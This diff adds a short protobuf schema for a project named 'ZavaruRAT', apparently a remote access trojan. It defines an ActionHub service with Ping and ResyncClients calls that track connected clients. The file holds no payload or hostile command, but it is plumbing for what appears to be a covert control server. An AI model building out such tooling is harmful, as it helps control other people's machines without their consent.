@@ -1,0 +1,17 @@
+syntax = "proto3";
+
+option csharp_namespace = "ZavaruRAT.Proto";
+package zavarurat;
+
+import "google/protobuf/empty.proto";
+import "events.proto";
+
+service ActionHub {
+  rpc Ping (google.protobuf.Empty) returns (google.protobuf.Empty);
+
+  rpc ResyncClients (ResyncClientsRequest) returns (google.protobuf.Empty);
+}
+
+message ResyncClientsRequest {
+  repeated ClientConnectedEvent clients = 1;
+}
